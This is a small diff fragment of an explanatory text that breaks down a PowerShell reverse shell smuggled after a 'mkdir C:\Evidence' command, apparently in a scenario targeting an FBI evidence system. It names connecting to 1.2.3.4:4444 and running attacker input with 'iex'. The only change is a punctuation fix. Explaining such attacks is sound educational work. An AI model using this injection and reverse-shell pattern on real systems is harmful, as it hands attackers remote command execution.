@@ -31,7 +31,7 @@ mkdir C:\Evidence\MyPhone & powershell -nop -c "$c=New-Object Net.Sockets.TCPCli
 
 2.) Net.Sockets.TCPClient('1.2.3.4', 4444): This is the reverse part. It tells the FBI computer to reach out to the attacker's IP address (1.2.3.4) on port 4444.
 
-3.) $s=$c.GetStream(): This creates a "data stream"—a two-way pipe for information to travel back and forth.
+3.) $s=$c.GetStream(): This creates a "data stream" a two-way pipe for information to travel back and forth.
 
 4.) iex $d: This is the most dangerous part. IEX stands for Invoke-Expression. It takes whatever text the attacker sends from their laptop ($d) and executes it as a live command on the FBI's system.
 
